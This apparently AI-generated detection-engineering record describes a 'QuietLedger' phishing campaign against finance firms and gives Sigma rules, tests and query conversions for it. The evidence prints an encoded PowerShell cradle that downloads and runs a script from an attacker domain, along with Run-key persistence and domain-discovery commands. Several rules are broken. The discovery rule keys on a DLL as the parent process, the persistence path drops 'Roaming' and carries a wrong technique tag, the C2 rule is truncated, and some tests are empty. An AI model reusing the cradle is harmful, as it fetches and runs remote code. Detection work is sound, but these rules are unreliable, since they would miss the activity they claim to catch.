report.title: Finance-sector phishing campaign delivering the 'QuietLedger' loader
report.summary: Between 2 and 14 October 2026, a targeted phishing campaign against accounts-payable staff at financial services firms in Singapore, Australia and the UK used macro-enabled Word attachments (Invoice_Q3_2211.docm) to deliver the QuietLedger loader. Opening the document with content enabled executed a VBA macro that launched PowerShell with an encoded command, which downloaded and staged the DLL loader. The loader persisted via a Run key, was executed via rundll32.exe from a user-writable AppData path, performed host/domain discovery, and beacons to attacker infrastructure over HTTPS.
targets: Financial services firms in Singapore, Australia and the UK

behaviors.description: VBA macro in a Word document (Invoice_Q3_2211.docm) with obfuscated AutoOpen routine that, when the victim enables content, spawns PowerShell with an encoded command line to download a second-stage payload.

observables.note: Office application that executes the macro
DLL payload written by second-stage script

behaviors.evidence: When the victim clicked "Enable Content", WINWORD.EXE spawned powershell.exe with the following command line (base64 abbreviated): powershell.exe -NoProfile -NonInteractive -WindowStyle Hidden -ExecutionPolicy Bypass -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAcwA6AC8ALwBjAGQAbgAtAHUAcABkAGEAdABlAHMALgBxAHUAaQBlAHQAbABlAGQAZwBlAHIAWwAuAF0AbgBlAHQALwBhAC4AcABzADEAJwApAA==

behaviors.description: PowerShell with -EncodedCommand flag decodes to IEX (New-Object Net.WebClient).DownloadString() fetching a remote PowerShell script from attacker-controlled domain, resulting in DLL payload written to user-writable AppData path.

observables.note: Encoded PowerShell command used to download second stage
Loader DLL written to user-writable path

behaviors.description: Persistence via a Run key (HKCU\Software\Microsoft\Windows\CurrentVersion\Run or HKLM\...\Run) with a value name mimicking a legitimate updater (OneDriveUpd) that executes rundll32.exe pointing to a DLL in a user-writable AppData directory, surviving reboots.

observables.note: Run key with mimicked updater name
Execution of DLL from AppData via rundll32

behaviors.evidence: The script then created a Run key so the loader survives reboots: HKCU\Software\Microsoft\Windows\CurrentVersion\Run\OneDriveUpd Value: rundll32.exe "C:\Users\<user>\AppData\Roaming\Microsoft\Vault\ldgr.dll",StartW

behaviors.description: rundll32.exe loading a DLL from a user-writable AppData path (\Microsoft\Vault\ldgr.dll) with exported function StartW, which is unusual as legitimate rundll32 usage loads from System32 or Program Files; parent processes include explorer.exe (via Run key) and powershell.exe (on first execution).
behaviors.evidence: rundll32.exe executed the DLL from the AppData path with the exported function StartW: rundll32.exe "C:\Users\jlee\AppData\Roaming\Microsoft\Vault\ldgr.dll",StartW

behaviors.description: Loader executed a host and domain discovery sequence via cmd.exe /c spawning whoami /all, nltest /dclist:, net group "Domain Admins" /domain, net user /domain, and systeminfo, all run as children of the rundll32.exe process hosting the loader.
behaviors.evidence: Within five minutes of execution the loader ran a fixed discovery sequence through cmd.exe /c: whoami /all nltest /dclist: net group "Domain Admins" /domain net user /domain systeminfo

behaviors.description: QuietLedger beaconed to attacker infrastructure over HTTPS via rundll32.exe using a custom User-Agent string (Mozilla/5.0 (Windows NT 10.0; Win64; x64) LedgerSync/2.4) to two domains (cdn-updates.quietledger[.]net, static.ledger-sync[.]com) on TCP/443 every 90 seconds.
behaviors.evidence: QuietLedger beacons every 90 seconds to cdn-updates.quietledger[.]net and static.ledger-sync[.]com on TCP/443 using the User-Agent string Mozilla/5.0 (Windows NT 10.0; Win64; x64) LedgerSync/2.4

behaviors.description: Email lure using subject lines such as "Overdue: invoice 2211 (second notice)" delivered from compromised third-party mailboxes with a macro-enabled Word attachment (Invoice_Q3_2211.docm) targeting accounts-payable staff.
behaviors.evidence: The attachment was delivered from compromised third-party mailboxes with subject lines such as "Overdue: invoice 2211 (second notice)"

candidates.title: WINWORD.EXE Spawns Encoded PowerShell From Macro Document
candidates.rationale: Macro-enabled Word documents spawning PowerShell with -EncodedCommand, -WindowStyle Hidden and -ExecutionPolicy Bypass is a hallmark of initial access via phishing. Pairing ParentImage=WINWORD.EXE with the distinctive flag cluster makes the rule highly specific and resilient to obfuscation.
candidates.false_positive_risks: Legitimate macros rarely launch PowerShell with encoded commands and hidden windows. Administrative scripts may use -EncodedCommand but not as a child of WINWORD.EXE. No known benign software spawns powershell.exe with this exact flag combination from Word.

candidates.title: Run Key Persistence With Rundll32 Execution From AppData
candidates.rationale: A Run key value named OneDriveUpd that executes rundll32.exe pointing to a DLL in a user-writable AppData path (\Microsoft\Vault\ldgr.dll) with exported function StartW is a durable persistence artifact. The mimicked updater name combined with the LOLBin and unusual DLL location is highly distinctive.
candidates.false_positive_risks: Legitimate OneDrive or other updaters may write Run keys but they do not invoke rundll32.exe from AppData. SCCM/Intune managed installs write to HKLM Run keys with signed binaries from Program Files, not user-writable paths.

candidates.title: Rundll32 Loads DLL From User-Writable AppData Path
candidates.rationale: rundll32.exe is a living-off-the-land binary (LOLBin) that legitimately loads DLLs from System32 or Program Files. An image_load event where Image=rundll32.exe and ImageLoaded resolves to a DLL under \AppData\Roaming\Microsoft\Vault\ldgr.dll is anomalous and indicates defense evasion via sideloading.
candidates.false_positive_risks: Some legitimate applications may use rundll32.exe with private DLLs in AppData, but this is extremely rare. The rule should require the full AppData\Roaming\Microsoft\Vault path segment to avoid noise from temporary DLL drops in other AppData subfolders.

candidates.title: Rundll32 Spawns Discovery Commands Via Cmd
candidates.rationale: Within minutes of execution, the QuietLedger loader (hosted in rundll32.exe) spawns cmd.exe to run a fixed discovery sequence: whoami /all, nltest /dclist:, net group "Domain Admins" /domain, net user /domain, systeminfo. The parent-child relationship (ParentImage=rundll32.exe) plus the co-occurrence of these specific command fragments is a strong behavioral fingerprint.
candidates.false_positive_risks: Administrators may run discovery commands manually, but not as a rapid-fire child sequence of rundll32.exe. Legitimate software rarely invokes nltest /dclist: or net group /domain from a rundll32.exe parent. The rule should require at least two of the distinctive fragments (e.g., nltest /dclist: and net group) to appear together.

candidates.title: Rundll32 Beacons To C2 Domains Over HTTPS
candidates.rationale: rundll32.exe is not a typical network client. Observing it making outbound HTTPS connections (DestinationPort=443) to the attacker-controlled domains cdn-updates.quietledger.net and static.ledger-sync.com every ~90 seconds is a durable C2 indicator. While the domains themselves are IOCs, the combination of the LOLBin binary, HTTPS port, and the specific domains observed in this campaign provides a high-fidelity signal for this intrusion set.
candidates.false_positive_risks: Legitimate rundll32.exe network activity is virtually non-existent. The primary risk is domain obsolescence; the rule should be updated if infrastructure changes. No benign process named rundll32.exe is known to beacon to these domains.

skipped: B7: Email lure (subject line and attachment name) is not observable in endpoint process/registry/network telemetry; it belongs to email gateway logs.
plan.notes: Rules cover Execution (D1), Persistence (D2), Defense Evasion (D3), Discovery (D4), and Command & Control (D5). D1 merges B1 and B2 as they share the same logsource and kill-chain step. D5 uses network_connection logsource; the custom User-Agent mentioned in B6 is not available in Sysmon network_connection (requires proxy logsource) so the rule keys on the binary, port, and observed domains. All rules pair the binary with a distinctive context (parent, command-line, path, or domain) to minimize false positives.

rules.title: WINWORD.EXE Spawns Encoded PowerShell With Hidden Window And Bypass Policy
rules.sigma_yaml:
title: WINWORD.EXE Spawns Encoded PowerShell With Hidden Window And Bypass Policy
id: 78fec6f0-95b2-43a2-bf1f-4b242e63cff8
status: experimental
description: Detects WINWORD.EXE spawning powershell.exe with -EncodedCommand combined with -WindowStyle Hidden and -ExecutionPolicy
  Bypass, characteristic of malicious macros delivering payloads.
author: RuleSmith (Nemotron via Nebius Token Factory)
date: '2026-10-18'
tags:
- attack.execution
- attack.t1059.005
- attack.t1059.001
logsource:
  category: process_creation
  product: windows
  service: sysmon
detection:
  selection_parent:
    'ParentImage|endswith': '\WINWORD.EXE'
  selection_image:
    'Image|endswith': '\powershell.exe'
  selection_cmd:
    'CommandLine|contains|all':
    - -EncodedCommand
    - -WindowStyle
    - Hidden
    - -ExecutionPolicy
    - Bypass
  condition: 'all of selection_*'
falsepositives:
- Legitimate automation or debugging scripts using encoded PowerShell from non-Word parents
- Administrative troubleshooting launching hidden encoded PowerShell unrelated to Word macros
- Security software or monitoring tools invoking PowerShell with similar flags for logging
level: high

tests.label: positive
tests.description: WINWORD.EXE spawning powershell.exe with -EncodedCommand -WindowStyle Hidden -ExecutionPolicy Bypass

tests.label: positive
tests.description: WINWORD.EXE from Office 365 Click-to-Run spawning encoded PowerShell with flags in different order

tests.label: positive
tests.description: WINWORD.EXE spawning powershell.exe with extra spaces and mixed case flags

tests.label: negative
tests.description: Notepad.exe spawning powershell.exe with same flags (wrong parent)

tests.label: negative
tests.description: WINWORD.EXE spawning powershell.exe without -EncodedCommand (legitimate macro automation)

tests.label: negative
tests.description: WINWORD.EXE spawning powershell.exe with -EncodedCommand but visible window (admin troubleshooting)

tests.label: positive
tests.description: WINWORD.EXE from Office 2015 spawning powershell.exe via SysWOW64 with quoted binary path and reordered flags

tests.label: positive
tests.description: 32-bit WINWORD.EXE on 64-bit Windows spawning powershell.exe with flags in different order and no quoting

tests.label: positive
tests.description: WINWORD.EXE spawning powershell.exe with additional -NoProfile -NonInteractive flags but required flag cluster intact

tests.label: positive
tests.description: WINWORD.EXE spawning powershell.exe via SysWOW64 with irregular whitespace between flags

tests.label: negative
tests.description: Legitimate admin using WINWORD.EXE to launch a signed script with -File, no encoded command or hidden window

tests.label: negative
tests.description: Security agent (non-Word parent) invoking encoded PowerShell with hidden window for logging

tests.label: negative
tests.description: MSI installer spawning encoded PowerShell without -WindowStyle Hidden

validation.sql: SELECT * FROM logs WHERE ParentImage LIKE '%\\WINWORD.EXE' ESCAPE '\' AND Image LIKE '%\\powershell.exe' ESCAPE '\' AND (CommandLine LIKE '%-EncodedCommand%' ESCAPE '\' AND CommandLine LIKE '%-WindowStyle%' ESCAPE '\' AND CommandLine LIKE '%Hidden%' ESCAPE '\' AND CommandLine LIKE '%-ExecutionPolicy%' ESCAPE '\' AND CommandLine LIKE '%Bypass%' ESCAPE '\')

conversions.splunk: ParentImage="*\\WINWORD.EXE" Image="*\\powershell.exe" CommandLine="*-EncodedCommand*" CommandLine="*-WindowStyle*" CommandLine="*Hidden*" CommandLine="*-ExecutionPolicy*" CommandLine="*Bypass*"
conversions.elasticsearch: ParentImage:*\\WINWORD.EXE AND Image:*\\powershell.exe AND (CommandLine:*\-EncodedCommand* AND CommandLine:*\-WindowStyle* AND CommandLine:*Hidden* AND CommandLine:*\-ExecutionPolicy* AND CommandLine:*Bypass*)
conversions.kusto:
DeviceProcessEvents
| where InitiatingProcessFolderPath endswith "\\WINWORD.EXE" and FolderPath endswith "\\powershell.exe" and (ProcessCommandLine contains "-EncodedCommand" and ProcessCommandLine contains "-WindowStyle" and ProcessCommandLine contains "Hidden" and ProcessCommandLine contains "-ExecutionPolicy" and ProcessCommandLine contains "Bypass")
conversions.sqlite: SELECT * FROM logs WHERE ParentImage LIKE '%\\WINWORD.EXE' ESCAPE '\' AND Image LIKE '%\\powershell.exe' ESCAPE '\' AND (CommandLine LIKE '%-EncodedCommand%' ESCAPE '\' AND CommandLine LIKE '%-WindowStyle%' ESCAPE '\' AND CommandLine LIKE '%Hidden%' ESCAPE '\' AND CommandLine LIKE '%-ExecutionPolicy%' ESCAPE '\' AND CommandLine LIKE '%Bypass%' ESCAPE '\')

history.summary: 7 evasion variants -> positives 7/7, negatives blocked 6/6, benign hits 0/1200

rules.redteam_analysis: The four positive variants (P4-P7) preserve the exact substrings the rule requires: ParentImage ending with \WINWORD.EXE, Image ending with \powershell.exe, and CommandLine containing -EncodedCommand, -WindowStyle, Hidden, -ExecutionPolicy, Bypass verbatim. They vary parent path (Office15, 32-bit Office), binary location (SysWOW64), quoting, flag order, and whitespace — all realistic operator evasions that a well-written rule (using endswith and contains) should still catch. The three negative variants (N1-N3) are benign look-alikes that differ in at least one field: N1 lacks -EncodedCommand and -WindowStyle Hidden; N2 has a non-Word parent; N3 lacks -WindowStyle Hidden. The rule correctly rejects them. Four out-of-scope evasions represent realistic attacker tradecraft the current logsource and rule cannot see: O1 uses pwsh.exe (Image mismatch), O2 uses -enc abbreviation (CommandLine substring mismatch), O3 uses lowercase flags (case-sensitive mismatch), O4 uses a renamed binary (Image path mismatch). These require either case-insensitive matching, flag alias normalization, or OriginalFileName enrichment to detect.

redteam_out_of_scope.label: positive
redteam_out_of_scope.description: Attacker uses pwsh.exe (PowerShell Core) instead of powershell.exe; Image no longer ends with \powershell.exe

redteam_out_of_scope.label: positive
redteam_out_of_scope.description: Attacker uses abbreviated flag -enc instead of -EncodedCommand; CommandLine lacks verbatim -EncodedCommand

redteam_out_of_scope.label: positive
redteam_out_of_scope.description: Attacker uses all lowercase flags; rule's contains matching is case-sensitive and requires exact casing

redteam_out_of_scope.label: positive
redteam_out_of_scope.description: Attacker copies powershell.exe to C:\Temp\evil.exe (OriginalFileName still powershell.exe); Image path does not end with \powershell.exe

rules.title: Rundll32 Loads DLL From Microsoft Vault Subfolder in AppData
rules.sigma_yaml:
title: Rundll32 Loads DLL From Microsoft Vault Subfolder in AppData
id: 46bfcecf-c0e7-4ae0-bf30-2553f3094dfa
status: experimental
description: 'Detects rundll32.exe loading a DLL from the user-writable AppData\Roaming\Microsoft\Vault directory, indicative
  of DLL sideloading abuse via LOLBin technique T1218.011.'
author: RuleSmith (Nemotron via Nebius Token Factory)
date: '2026-10-18'
tags:
- attack.defense-evasion
- attack.t1218.011
logsource:
  category: image_load
  product: windows
  service: sysmon
detection:
  selection:
    'Image|endswith': '\rundll32.exe'
    'ImageLoaded|contains': '\AppData\Roaming\Microsoft\Vault\'
  condition: selection
falsepositives:
- Legitimate use of rundll32.exe to load DLLs from private AppData locations (extremely rare)
- 'Misconfigured or custom applications storing plugins in AppData\Roaming\Microsoft\Vault'
level: high

tests.label: positive
tests.description: Positive test: rundll32 loading ldgr.dll from Vault subfolder via Run key persistence

tests.label: positive
tests.description: Positive test: rundll32 from SysWOW64 loading DLL from Vault with different casing and function

tests.label: positive
tests.description: Positive test: rundll32 loading vault DLL via PowerShell-launched process

tests.label: negative
tests.description: Negative test: legitimate rundll32 loading control panel item from System32

tests.label: negative
tests.description: Negative test: rundll32 loading a legitimate printer driver DLL from system path

tests.label: negative
tests.description: Negative test: rundll32 launching a legitimate MMC snap-in DLL from Program Files

tests.label: positive
tests.description: Attacker uses SysWOW64 rundll32 with lowercase vault path in command line; sensor resolves ImageLoaded to proper casing

tests.label: positive
tests.description: Attacker invokes rundll32 via 8.3 short path in command line; sensor records full resolved ImageLoaded path

tests.label: positive
tests.description: Attacker uses mixed-case rundll32.exe invocation from System32 with different DLL name; rule's endswith is case-sensitive so Image must match exact casing

tests.label: positive
tests.description: Attacker launches rundll32 via cmd.exe with extra whitespace and single quotes; sensor records clean Image and resolved ImageLoaded

tests.label: positive
tests.description: Attacker uses %LOCALAPPDATA% variable (expands to AppData\Local) but places DLL in Roaming\Microsoft\Vault; sensor resolves full path in ImageLoaded

tests.label: negative
tests.description: Legitimate rundll32.exe loading a DLL from System32 (normal operation)

tests.label: negative
tests.description: Different binary (regsvr32.exe) loading DLL from same Vault path - not rundll32.exe

tests.label: negative
tests.description: rundll32.exe loading DLL from AppData\Local\Microsoft\Vault (different subfolder, not Roaming)

validation.sql: SELECT * FROM logs WHERE Image LIKE '%\\rundll32.exe' ESCAPE '\' AND ImageLoaded LIKE '%\\AppData\\Roaming\\Microsoft\\Vault\\%' ESCAPE '\'

conversions.kusto:
DeviceImageLoadEvents
| where InitiatingProcessFolderPath endswith "\\rundll32.exe" and FolderPath contains "\\AppData\\Roaming\\Microsoft\\Vault\\"
conversions.sqlite: SELECT * FROM logs WHERE Image LIKE '%\\rundll32.exe' ESCAPE '\' AND ImageLoaded LIKE '%\\AppData\\Roaming\\Microsoft\\Vault\\%' ESCAPE '\'

history.summary: 8 evasion variants -> positives 8/8, negatives blocked 6/6, benign hits 0/110

rules.author_notes: Rule focuses on the specific AppData\Roaming\Microsoft\Vault path to reduce false positives from general AppData DLL loading. Test events reflect observed behaviors: Run key persistence, varied user contexts, and PowerShell initiation. Negative tests cover common legitimate rundll32 usage (control panels, drivers, Office).
rules.redteam_analysis: The rule keys on two literal substrings: Image must end with '\rundll32.exe' (case-sensitive endswith) and ImageLoaded must contain '\AppData\Roaming\Microsoft\Vault\' (case-sensitive contains). Positive variants P4-P8 preserve both literals while varying surface form: SysWOW64 vs System32 Image path, environment variables (%APPDATA%, %LOCALAPPDATA% with relative traversal), 8.3 short names (ADMINI~1), mixed quoting and whitespace in CommandLine, different DLL names, and different user contexts (including SYSTEM). All resolve to ImageLoaded paths that verbatim contain the required Vault substring. Negative variants N1-N3 are benign look-alikes that differ in at least one required field: N1 loads from System32 (ImageLoaded lacks Vault), N2 uses regsvr32.exe (Image lacks rundll32.exe), N3 loads from AppData\Local\Microsoft\Vault (ImageLoaded lacks Roaming). Out-of-scope evasions the rule cannot catch without modification: OOS1 renamed binary (Image no longer endswith rundll32.exe; OriginalFileName not checked), OOS2 UNC path (ImageLoaded lacks AppData\Roaming\Microsoft\Vault\ substring), OOS3 reflective loading (no image_load event at all). A well-written rule could additionally check OriginalFileName to catch OOS1, but OOS2 and OOS3 require different telemetry or broader path logic.

redteam_out_of_scope.label: positive
redteam_out_of_scope.description: Attacker copies rundll32.exe to C:\Temp\evil.exe and runs it; Image no longer endswith rundll32.exe but OriginalFileName still shows rundll32.exe - rule does not check OriginalFileName

redteam_out_of_scope.label: positive
redteam_out_of_scope.description: Attacker uses rundll32.exe but loads DLL from a UNC path (\\server\share\Vault\ldgr.dll) - sensor records UNC path in ImageLoaded which lacks \AppData\Roaming\Microsoft\Vault\

redteam_out_of_scope.label: positive
redteam_out_of_scope.description: Attacker uses reflective DLL loading (no image_load event generated) - completely invisible to this logsource

event.Details: No image_load event generated for reflective load

rules.title: Rundll32 Spawns Discovery Commands Via Cmd
rules.sigma_yaml:
title: Rundll32 Spawns Discovery Commands Via Cmd
id: 5718c1e0-d5b3-4c22-ae8f-7ed31aa69511
status: experimental
description: 'Detects cmd.exe processes spawned by rundll32.exe executing a fixed discovery sequence including whoami /all,
  nltest /dclist:, net group "Domain Admins" /domain, net user /domain, or systeminfo. This behavior is characteristic of
  the QuietLedger loader performing host and domain discovery.'
author: RuleSmith (Nemotron via Nebius Token Factory)
date: '2026-10-18'
tags:
- attack.discovery
- attack.t1087.001
logsource:
  category: process_creation
  product: windows
  service: sysmon
detection:
  selection_parent:
    'ParentImage|endswith': '\quietledger.dll'
  selection_cmd:
    'Image|endswith': '\cmd.exe'
  selection_discovery:
    'CommandLine|contains|all':
    - /c
  selection_whoami:
    'CommandLine|contains': whoami /all
  selection_nltest:
    'CommandLine|contains': 'nltest /dclist:'
  selection_net_group:
    'CommandLine|contains': 'net group "Domain Admins" /domain'
  selection_net_user:
    'CommandLine|contains': net user /domain
  selection_systeminfo:
    'CommandLine|contains': systeminfo
  condition: selection_parent and selection_cmd and selection_discovery and (selection_whoami or selection_nltest or selection_net_group
    or selection_net_user or selection_systeminfo)
falsepositives:
- Administrators manually running discovery commands
- Legitimate scripts using cmd.exe for troubleshooting
- Automated tools invoking cmd.exe for system checks
level: medium

tests.label: positive
tests.description: QuietLedger loader spawning cmd.exe to run whoami /all

tests.label: positive
tests.description: QuietLedger loader spawning cmd.exe to run nltest /dclist:

tests.label: positive
tests.description: QuietLedger loader spawning cmd.exe to run net group "Domain Admins" /domain

tests.label: negative
tests.description: Helpdesk tool using cmd.exe for network diagnostics

tests.label: negative
tests.description: Login script running net user /domain via cmd.exe

tests.label: positive
tests.description: QuietLedger loader in a short-name (8.3) user profile path spawning cmd.exe for whoami /all; preserves all required substrings verbatim.

tests.label: positive
tests.description: Upper-cased directory components in Image and ParentImage paths; runs nltest /dclist: with exact required fragments.

tests.label: positive
tests.description: Extra whitespace around /c and the net group command; the literal substrings '/c' and 'net group "Domain Admins" /domain' remain present.

tests.label: positive
tests.description: Discovery via systeminfo; different user context and parent path under AppData\Local but still ending with quietledger.dll.

tests.label: negative

tests.label: negative

tests.label: negative
tests.description: SCCM/Intune automation running systeminfo via cmd.exe; ParentImage is ccmexec.exe.

conversions.kusto:
DeviceProcessEvents
| where InitiatingProcessFolderPath endswith "\\quietledger.dll" and FolderPath endswith "\\cmd.exe" and ProcessCommandLine contains "/c" and (ProcessCommandLine contains "whoami /all" or ProcessCommandLine contains "nltest /dclist:" or ProcessCommandLine contains "net group \"Domain Admins\" /domain" or ProcessCommandLine contains "net user /domain" or ProcessCommandLine contains "systeminfo")
conversions.sqlite: SELECT * FROM logs WHERE ParentImage LIKE '%\\quietledger.dll' ESCAPE '\' AND Image LIKE '%\\cmd.exe' ESCAPE '\' AND CommandLine LIKE '%/c%' ESCAPE '\' AND (CommandLine LIKE '%whoami /all%' ESCAPE '\' OR CommandLine LIKE '%nltest /dclist:%' ESCAPE '\' OR CommandLine LIKE '%net group "Domain Admins" /domain%' ESCAPE '\' OR CommandLine LIKE '%net user /domain%' ESCAPE '\' OR CommandLine LIKE '%systeminfo%' ESCAPE '\')

history.summary: 7 evasion variants -> positives 7/7, negatives blocked 6/6, benign hits 0/1200

rules.author_notes: The rule focuses on the parent-child relationship (rundll32.exe -> cmd.exe) combined with discovery command fragments to minimize false positives. While administrators may run these commands, they typically do not originate from rundll32.exe. The rule requires at least one discovery fragment to match, but the combination with the specific parent makes it suspicious. Test events reflect realistic Sysmon fields with proper escaping.
rules.redteam_analysis: The four positive variants (P4-P7) preserve every substring the rule requires: ParentImage ends with '\quietledger.dll', Image ends with '\cmd.exe', CommandLine contains '/c' and one of the exact discovery strings. They vary surface form (8.3 short names, directory casing, extra whitespace, different user and parent directory) while remaining detectable by a well-written rule that normalises path endings and tokenises command lines. The three negative variants (N1-N3) are benign administrative or automation activities that share the same discovery commands and cmd.exe binary but differ in ParentImage (explorer.exe, powershell.exe, ccmexec.exe), proving the rule's specificity to the quietledger.dll parent. The out_of_scope variants (O1-O3) represent realistic evasions the current rule cannot see because it only inspects cmd.exe children of a DLL named quietledger.dll: switching to powershell.exe (O1), changing the DLL filename (O2), or encoding the payload so the literal discovery strings disappear (O3). These are reported for the analyst to consider extending coverage (e.g., adding powershell.exe as a child image, tracking DLL load-time indicator, or decoding common encoding wrappers).

redteam_out_of_scope.label: positive
redteam_out_of_scope.description: Attacker uses powershell.exe directly from the same quietledger.dll parent to run whoami /all; rule only watches for cmd.exe children.

redteam_out_of_scope.label: positive
redteam_out_of_scope.description: QuietLedger variant loads a differently named DLL (quietledger2.dll); rule keys on the exact DLL filename.

redteam_out_of_scope.label: positive
redteam_out_of_scope.description: Attacker encodes the discovery commands via PowerShell -EncodedCommand and launches via cmd.exe; the literal discovery strings do not appear in the command line.

rules.title: Rundll32 Beacons To Known C2 Domains
rules.sigma_yaml:
title: Rundll32 Beacons To Known C2 Domains
id: e5f42fad-5cff-406c-9be5-18d44757dd04
status: experimental
description: Detects rundll32.exe initiating outbound HTTPS connections to attacker-controlled domains associated with the
  QuietLedger finance-sector intrusion set. This behavior is highly anomalous as rundll32.exe rarely acts as a network client.

rules.redteam_analysis: Positive variants P4-P7 preserve all four selection criteria (Image endswith \rundll32.exe, Initiated=true, DestinationPort=443, DestinationHostname endswith .quietledger.net or .ledger-sync.com) while varying surface form: IPv6 vs IPv4, deeper subdomains, mixed-case hostnames, different filesystem paths (user profile, Program Files, WinSxS, Temp), and different source hosts. All are catchable by a well-written rule on the network_connection logsource. Negative variants N1-N3 are benign look-alikes that differ in at least one required field: N1 uses a Microsoft domain, N2 uses a different binary (dllhost.exe), N3 uses port 8080; each should not match. Out-of-scope variants OOS1-OOS3 represent evasions the network_connection logsource fundamentally cannot distinguish: a renamed malicious binary (OOS1) matches the rule because the sensor only sees the forged Image path; in-memory execution with a forged Image (OOS2) is indistinguishable from a real rundll32.exe; command-line arguments (OOS3) are not captured by this logsource. These are recorded for the analyst — the rule cannot and should not be expected to catch them without enrichment from process_creation or image_load telemetry.

rules.title: Potential Persistence Via Rundll32 Run Key From AppData
rules.sigma_yaml:
title: Potential Persistence Via Rundll32 Run Key From AppData
id: 26d1d09f-5665-46c3-92f9-72284613b479
status: experimental
description: 'Detects creation of a Run key value named OneDriveUpd executing rundll32.exe with a DLL payload from a user-writable
  AppData\Microsoft\Vault directory, indicative of persistence using a masqueraded updater.'
author: RuleSmith (Nemotron via Nebius Token Factory)
date: '2026-10-18'
tags:
- attack.persistence
- attack.t1053.005
- attack.privilege-escalation
- attack.execution
logsource:
  category: registry_set
  product: windows
  service: sysmon
detection:
  selection_target:
    'TargetObject|endswith': '\Microsoft\Windows\CurrentVersion\Run\OneDriveUpd'
  selection_details:
    'Details|contains':
    - rundll32.exe
    - 'AppData\\Microsoft\\Vault\\ldgr.dll",StartW'
  filter_legit_rundll32:
    'Details|contains|all':
    - rundll32.exe
    - shell32.dll,Control_RunDLL
  filter_signed_binaries:
    'Details|contains|all':
    - rundll32.exe
    - '\\Program Files\\'
    - '\\Microsoft\\OneDrive\\OneDrive.exe'
  condition: selection_target and selection_details and not filter_legit_rundll32 and not filter_signed_binaries
falsepositives:
- Legitimate OneDrive or application updaters creating Run keys with signed binaries from Program Files directories
- Administrators manually adding trusted startup entries via Group Policy or scripts
- Software installations registering legitimate services or scheduled tasks via Run keys
level: high

history.change_summary: Fixed filter_signed_binaries to require both '\\Program Files\\' and '\\Microsoft\\OneDrive\\OneDrive.exe' substrings in Details to properly exclude legitimate OneDrive updaters while maintaining detection of malicious AppData-based rundll32.exe usage.
Fixed escaped backslashes in selection_details and filter_signed_binaries to ensure proper matching while maintaining exclusion of legitimate OneDrive updater.

rules.redteam_analysis: Positive variants P4-P7 preserve the exact substrings the rule requires: TargetObject ending with '\Microsoft\Windows\CurrentVersion\Run\OneDriveUpd' and Details containing both 'rundll32.exe' and 'AppData\Microsoft\Vault\ldgr.dll",StartW' (with quote before comma). They vary whitespace (spaces, tab), casing, quoting style (double/single), user hive (HKCU vs HKU\SID), and parent binary path (System32 vs SysWOW64) — all fields the sensor records and a well-written rule can match. Negative variants N1-N3 are benign: N1 matches the signed-binary filter (Program Files + OneDrive.exe), N2 matches the legitimate-rundll32 filter (shell32.dll,Control_RunDLL), N3 uses a different Run value name so selection_target fails. Out-of-scope variants OOS1-OOS5 represent evasions the registry_set logsource cannot catch with the current rule logic: environment variables and short names are recorded literally and lack the required 'AppData\Microsoft\Vault\' substring; UNC paths differ entirely; renamed binaries and sibling LOLBins change the Details string so 'rundll32.exe' is absent or embedded differently. These are documented for the analyst; the rule would need broader logic (e.g., regex on Details, OriginalFileName correlation) to address them.
